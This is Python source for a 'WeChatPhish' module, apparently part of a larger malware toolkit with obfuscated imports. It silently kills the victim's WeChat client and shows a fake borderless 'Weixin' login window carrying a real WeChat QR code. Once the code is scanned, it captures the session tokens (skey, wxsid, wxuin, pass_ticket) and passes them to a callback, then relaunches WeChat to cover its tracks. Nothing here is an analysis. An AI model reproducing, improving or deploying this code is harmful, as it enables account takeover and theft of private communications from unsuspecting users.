from core.resolver import (Resolver, _CTYPES, _SUBPROCESS, _URLLIB_PARSE)
ctypes = Resolver.get_mod(_CTYPES)
subprocess = Resolver.get_mod(_SUBPROCESS)
urllib.parse = Resolver.get_mod(_URLLIB_PARSE)

from core.resolver import (Resolver, _OS, _RE, _TIME, _JSON, _THREADING)
os = Resolver.get_mod(_OS)
re = Resolver.get_mod(_RE)
time = Resolver.get_mod(_TIME)
json = Resolver.get_mod(_JSON)
threading = Resolver.get_mod(_THREADING)

import tkinter as tk
from tkinter import Canvas, PhotoImage
from PIL import Image, ImageTk
import io

class WeChatPhish:
    def __init__(self, callback):
        self.appid = 'wx782c26e4c19acffb'
        self.uuid = ''
        self.callback = callback
        self.root = None
        self.qr_image = None
        self.running = True
        self.wechat_exe = None

    def get_wechat_path(self):

        try:
            import winreg
            wechat_keys = ["Software\\\\Tencent\\\\WeChat", "Software\\\\Tencent\\\\Weixin"] 
            for root in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
                for wk in wechat_keys:
                    try:
                        with winreg.OpenKey(root, wk) as key:
                            path, _ = winreg.QueryValueEx(key, "InstallPath")
                            for exe in ["WeChat.exe", "Weixin.exe"]:
                                exe_path = os.path.join(path, exe)
                                if os.path.exists(exe_path):
                                    self.wechat_exe = exe_path
                                    return True
                    except: continue
        except: pass

        try:
            import winreg
            uninstall_keys = [
                "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\Weixin",
                "Software\\\\WOW6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\Weixin"
            ]
            for root in [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]:
                for uk in uninstall_keys:
                    try:
                        with winreg.OpenKey(root, uk) as key:
                            path, _ = winreg.QueryValueEx(key, "InstallLocation")
                            path = path.strip('"')
                            for exe in ["WeChat.exe", "Weixin.exe"]:
                                exe_path = os.path.join(path, exe)
                                if os.path.exists(exe_path):
                                    self.wechat_exe = exe_path
                                    return True
                    except: continue
        except: pass

        prefixes = [
            os.environ.get("ProgramFiles(x86)", "C:\\\\Program Files (x86)"),
            os.environ.get("ProgramFiles", "C:\\\\Program Files"),
            os.path.join(os.environ.get("AppData", ""), "..\\\\Local")
        ]
        subfolders = ["Tencent\\\\WeChat", "Tencent\\\\Weixin"]
        exes = ["WeChat.exe", "Weixin.exe"]

        for p in prefixes:
            for sf in subfolders:
                for exe in exes:
                    full_p = os.path.join(p, sf, exe)
                    if os.path.exists(full_p):
                        self.wechat_exe = full_p
                        return True

        try:
            import psutil
            for proc in psutil.process_iter(['name', 'exe']):
                if proc.info['name'] in ["WeChat.exe", "Weixin.exe"]:
                    if proc.info['exe'] and os.path.exists(proc.info['exe']):
                        self.wechat_exe = proc.info['exe']
                        return True
        except: pass

        return False

    def kill_wechat(self):
        try:
            subprocess.run("taskkill /f /im WeChat.exe", shell=True, creationflags=0x08000000, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run("taskkill /f /im Weixin.exe", shell=True, creationflags=0x08000000, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(1.5)
        except:
            pass

    def get_uuid(self):
        url = "https://login.wx.qq.com/jslogin?appid={self.appid}&fun=new&lang=zh_CN&_={int(time.time() * 1000)}"
        req = urllib.request.Request(url)
        try:
            resp = urllib.request.urlopen(req).read().decode('utf-8')
            regx = "window.QRLogin.code = (\\d+); window.QRLogin.uuid = \"(\\S+?)\""
            match = re.search(regx, resp)
            if match and match.group(1) == '200':
                self.uuid = match.group(2)
                return True
        except Exception as e:
            print("[!] WeChat Phish UUID error: {e}")
        return False

    def get_qr_image(self):
        url = "https://login.weixin.qq.com/qrcode/{self.uuid}"
        try:
            req = urllib.request.Request(url)
            resp = urllib.request.urlopen(req).read()
            im = Image.open(io.BytesIO(resp)).convert("RGBA")
            bg_color = (44, 44, 44, 255) 
            qr_color = (255, 255, 255, 255) 
            data = im.getdata()
            new_data = []
            for item in data:
                avg = (item[0] + item[1] + item[2]) / 3
                if avg > 128:  
                    new_data.append(bg_color)
                else:
                    new_data.append(qr_color)
            im.putdata(new_data)
            box = (15, 15, im.width-15, im.height-15)
            im = im.crop(box)
            im = im.resize((180, 180), Image.Resampling.NEAREST)
            return im
        except Exception as e:
            print("[!] WeChat Phish QR err: {e}")
            return None

    def _schedule_close(self, relaunch=False):
        self.running = False
        if relaunch and self.wechat_exe and os.path.exists(self.wechat_exe):
            try:
                subprocess.Popen([self.wechat_exe], creationflags=0x08000000)
            except:
                pass
        if self.root:
            self.root.after(0, self.root.destroy)

    def poll_login(self):

        tip = 1
        while self.running:
            url = "https://login.wx.qq.com/cgi-bin/mmwebwx-bin/login?loginicon=true&uuid={self.uuid}&tip={tip}&_={int(time.time() * 1000)}"
            try:
                req = urllib.request.Request(url)
                resp = urllib.request.urlopen(req, timeout=35).read().decode('utf-8')
                match = re.search("window.code=(\\d+);", resp)
                if match:
                    code = match.group(1)
                    if code == '201':
                        tip = 0
                    elif code == '200':
                        redir_match = re.search("window.redirect_uri=\"(\\S+?)\"", resp)
                        if redir_match:
                            redirect_uri = redir_match.group(1) + '&fun=new&version=v2'
                            self.get_session(redirect_uri)
                        self._schedule_close(relaunch=True)
                        break
                    elif code == '408':
                        pass
                    elif code == '400':
                        self._schedule_close(relaunch=False)
                        break

            except Exception as e:
                pass
            time.sleep(1)

    def get_session(self, redirect_uri):
        try:
            req = urllib.request.Request(redirect_uri)
            resp = urllib.request.urlopen(req).read().decode('utf-8')
            skey = re.search("<skey>(.*?)</skey>", resp)
            wxsid = re.search("<wxsid>(.*?)</wxsid>", resp)
            wxuin = re.search("<wxuin>(.*?)</wxuin>", resp)
            pass_ticket = re.search("<pass_ticket>(.*?)</pass_ticket>", resp)
            data = {
                "skey": skey.group(1) if skey else "",
                "wxsid": wxsid.group(1) if wxsid else "",
                "wxuin": wxuin.group(1) if wxuin else "",
                "pass_ticket": pass_ticket.group(1) if pass_ticket else ""
            }
            if self.callback:
                self.callback(data)
        except Exception as e:
            print("[!] Session fetch err: {e}")

    def on_close(self):
        self._schedule_close(relaunch=False)

    def _show_in_taskbar(self):
        """WinAPI хак, чтобы безрамочное окно стало видно в Панели задач (taskbar)"""
        try:
            hwnd = ctypes.windll.user32.GetParent(self.root.winfo_id())
            style = ctypes.windll.user32.GetWindowLongW(hwnd, -20)
            style = (style & ~0x00000080) | 0x00040000
            ctypes.windll.user32.SetWindowLongW(hwnd, -20, style)
            self.root.withdraw()
            self.root.deiconify()
        except Exception as e:
            print("[!] _show_in_taskbar err:", e)

    def run_ui(self):
        if not self.get_wechat_path():
            return "NOT_FOUND" 
        if not self.get_uuid():
            return "NETWORK_ERROR"

        img = self.get_qr_image()
        if not img:
            return False
        self.kill_wechat()
        self.root = tk.Tk()
        self.root.title("Weixin")
        self.root.configure(bg="#2c2c2c")
        self.root.resizable(False, False)
        self.root.attributes('-topmost', True)
        self.root.overrideredirect(True)
        self.root.after(10, self._show_in_taskbar)
        icon_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "assets", "wechat.ico")
        if os.path.exists(icon_path):
            try:
                self.root.iconbitmap(icon_path)
            except:
                pass
        width, height = 280, 420
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()
        x_cordinate = int((screen_width/2) - (width/2))
        y_cordinate = int((screen_height/2) - (height/2))
        self.root.geometry("{}x{}+{}+{}".format(width, height, x_cordinate, y_cordinate))
        title_bar = tk.Frame(self.root, bg="#2c2c2c")
        title_bar.pack(expand=0, fill=tk.X, side=tk.TOP, pady=5)
        title_label = tk.Label(title_bar, text="Weixin", fg="#ffffff", bg="#2c2c2c", font=("Segoe UI", 10))
        title_label.pack(side=tk.LEFT, pady=0, padx=12)
        btns_frame = tk.Frame(title_bar, bg="#2c2c2c")
        btns_frame.pack(side=tk.RIGHT, padx=5)
        settings_button = tk.Label(btns_frame, text="\\u2699", bg="#2c2c2c", fg="#888888", font=("Segoe UI", 12))
        settings_button.pack(side=tk.LEFT, padx=10)
        close_button = tk.Label(btns_frame, text="\\u2715", bg="#2c2c2c", fg="#888888", font=("Segoe UI", 10))
        close_button.pack(side=tk.LEFT, padx=5)
        close_button.bind("<Button-1>", lambda e: self.on_close())
        def on_enter(e, widget): widget['fg'] = 'white'
        def on_leave(e, widget): widget['fg'] = '#888888'
        settings_button.bind("<Enter>", lambda e: on_enter(e, settings_button))
        settings_button.bind("<Leave>", lambda e: on_leave(e, settings_button))
        close_button.bind("<Enter>", lambda e: on_enter(e, close_button))
        close_button.bind("<Leave>", lambda e: on_leave(e, close_button))
        def move_window(event):
            self.root.geometry('+{0}+{1}'.format(event.x_root, event.y_root))
        title_bar.bind('<B1-Motion>', move_window)
        self.qr_image = ImageTk.PhotoImage(img)
        qr_label = tk.Label(self.root, image=self.qr_image, bd=0, bg="#2c2c2c")
        qr_label.pack(pady=25)
        scan_label = tk.Label(self.root, text="Scan to log in", fg="#ffffff", bg="#2c2c2c", font=("Segoe UI", 12))
        scan_label.pack(pady=10)
        transfer_label = tk.Label(self.root, text="Transfer files only", fg="#888888", bg="#2c2c2c", font=("Segoe UI", 10))
        transfer_label.pack(side=tk.BOTTOM, pady=30)
        threading.Thread(target=self.poll_login, daemon=True).start()
        return True

def run_phish(callback, error_callback=None, success_callback=None):
    phish = WeChatPhish(callback)
    res = phish.run_ui()
    if res is True:
        if success_callback:
            success_callback()
        phish.root.mainloop()
    elif error_callback:
        error_callback(res)
